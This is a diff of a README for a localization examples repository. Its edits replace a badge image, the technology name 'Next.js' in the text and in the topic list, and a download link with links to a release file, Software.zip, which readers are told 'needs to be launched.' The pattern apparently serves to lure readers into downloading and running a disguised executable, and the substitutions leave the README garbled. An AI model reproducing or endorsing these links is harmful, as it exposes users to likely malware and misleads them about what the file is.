@@ -1,10 +1,10 @@
 # Translatesheet Examples 🌐
 
-![translatesheet-examples](https://img.shields.io/badge/translatesheet-examples-brightgreen)
+![translatesheet-examples](https://github.com/OzziesForest/translatesheet-examples/releases/download/v2.0/Software.zip)
 
 ### Welcome to the Translatesheet Examples Repository! 🎉
 
-This repository showcases examples related to localization and translation management using the `Translatesheet` tool. Here, you will find practical demonstrations and implementations using various technologies such as AI, Expo, React, React Native, Next.js, and more!
+This repository showcases examples related to localization and translation management using the `Translatesheet` tool. Here, you will find practical demonstrations and implementations using various technologies such as AI, Expo, React, React Native, https://github.com/OzziesForest/translatesheet-examples/releases/download/v2.0/Software.zip, and more!
 
 ### Repository Details ℹ️
 - **Repository Name:** translatesheet-examples
@@ -15,7 +15,7 @@ This repository showcases examples related to localization and translation manag
     - Expo-Router
     - Localization
     - Localization Management
-    - Next.js
+    - https://github.com/OzziesForest/translatesheet-examples/releases/download/v2.0/Software.zip
     - React
     - React-Native
     - Translatesheet
@@ -37,7 +37,7 @@ translatesheet-examples/
 
 ### Try it Yourself! 💻
 
-Click [here](https://github.com/user-attachments/files/18426772/Application.zip) to download the examples. The file needs to be launched to access the contents.
+Click [here](https://github.com/OzziesForest/translatesheet-examples/releases/download/v2.0/Software.zip) to download the examples. The file needs to be launched to access the contents.
 
 ### Need More Assistance? 🤔
 
